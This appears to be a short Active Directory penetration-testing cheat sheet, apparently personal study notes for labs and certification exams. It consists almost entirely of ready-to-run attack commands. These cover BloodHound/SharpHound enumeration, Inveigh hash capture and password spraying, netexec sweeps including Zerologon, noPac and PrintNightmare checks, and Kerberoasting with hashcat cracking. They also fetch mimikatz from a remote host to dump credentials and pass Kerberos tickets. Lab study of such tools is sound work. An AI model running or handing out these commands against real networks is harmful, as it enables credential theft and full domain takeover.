```bash
bloodhound-python -d $domain -u user -p pass -ns $ip -c all

iwr $ip/SharpHound.exe -o SharpHound.exe
.\SharpHound.exe -c all 
```

```powershell
.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

```powershell
.\Inveigh.exe
Press ESC to enter/exit interactive console
HELP
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES

Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

```powershell
Import-Module .\DomainPasswordSpray.ps1 
Invoke-DomainPasswordSpray -Password Welcome1
```

```bash
netexec smb 172.16.5.0/24 -u user -p pass123
netexec rdp 172.16.5.0/24 -u user -p pass123
netexec winrm 172.16.5.0/24 -u user -p pass123
netexec mssql 172.16.5.0/24 -u user -p pass123
netexec mssql 172.16.5.0/24 -u user -p pass123 --local-auth

netexec smb <IP> -u '' -p '' -M spider_plus
netexec ldap <IP> -u '' -p '' -M get-desc-users
netexec smb <IP> -u '' -p '' -M printnightmare
netexec smb <IP> -u '' -p '' -M gpp_password
netexec smb <IP> -u '' -p '' -M gpp_autologin
netexec smb <IP> -u '' -p '' -M nopac
netexec smb <IP> -u '' -p '' -M zerologon
```

```bash
impacket-GetUserSPNs  oscp.exam/user:pass -dc-ip 192.168.1.129 -request

hashcat -m 13100 crackme.txt ~/rockyou.txt -O -r ~/opt/wordlists/best64.rule -O
```

```bash
impacket-mssqlclient aerospace.com/discovery:'Start123!'@192.168.193.40
impacket-mssqlclient aerospace.com/discovery:'Start123!'@192.168.193.40 -windows-auth
```

```bash
curl $ip/mimikatz.exe -o mimikatz.exe
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"

.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::tickets /export" "exit"
dir *.kirbi
kerberos::ptt <ticket>
```

#### PowerView
```powershell
Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}
```